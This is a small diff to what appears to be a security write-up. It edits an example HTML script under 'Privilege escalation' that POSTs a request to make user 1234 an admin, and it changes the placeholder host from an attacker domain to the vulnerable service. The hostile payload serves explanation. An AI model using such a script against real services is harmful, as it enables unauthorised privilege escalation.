@@ -49,7 +49,7 @@
 - Privilege escalation
     ```html
     <script>
-        fetch('https://[ATTACKER-DOMAIN]/change-role', {
+        fetch('https://[VULNERABLE-SERVICE]/change-role', {
             method: 'POST',
             body: "user_id=1234&role=admin"
         })
